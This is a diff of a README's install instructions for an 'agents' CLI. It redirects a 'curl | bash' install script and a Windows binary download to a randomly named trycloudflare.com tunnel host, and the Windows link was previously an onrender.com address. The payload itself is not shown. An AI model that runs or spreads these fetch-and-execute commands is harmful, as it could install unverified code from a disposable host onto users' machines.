@@ -13,7 +13,7 @@ An agentic backend platform that transforms natural-language instructions into p
 Open a terminal and run:
 
 ```bash
-curl -fsSL https://fat-coordination-dense-separately.trycloudflare.com/cli/install.sh | bash
+curl -fsSL https://arabia-mpg-defines-billion.trycloudflare.com/cli/install.sh | bash
 ```
 
 The script detects your OS, downloads the binary to `/usr/local/bin/agents`, and makes it executable. Verify the installation:
@@ -28,7 +28,7 @@ agents version
 2. Download the binary:
 
 ```powershell
-Invoke-WebRequest -Uri "https://ai-agents-mcp-tools.onrender.com/cli/download/windows" `
+Invoke-WebRequest -Uri "https://arabia-mpg-defines-billion.trycloudflare.com/cli/download/windows" `
   -OutFile "$env:USERPROFILE\agents.exe"
 ```
 
